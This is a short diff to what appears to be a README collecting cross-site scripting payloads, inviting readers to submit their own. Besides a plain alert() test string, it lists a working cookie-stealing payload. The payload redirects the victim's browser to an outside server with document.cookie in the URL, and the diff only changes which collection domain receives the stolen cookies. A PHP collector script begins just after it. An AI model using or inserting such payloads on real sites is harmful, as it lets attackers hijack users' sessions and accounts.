@@ -12,7 +12,7 @@ Write you example of XSS and we post it here :)
 
 1) `"><script>alert()</script>` 
 
-2) `"><script language= "JavaScript">document.location="http://atastycookie.me/skrill/xss.php?cookie=" + document.cookie;document.location="http://atastycookie.me"</script>`
+2) `"><script language= "JavaScript">document.location="http://rananyev.ru/xss/xss.php?cookie=" + document.cookie;document.location="http://rananyev.ru"</script>`
 
     <?php 
     
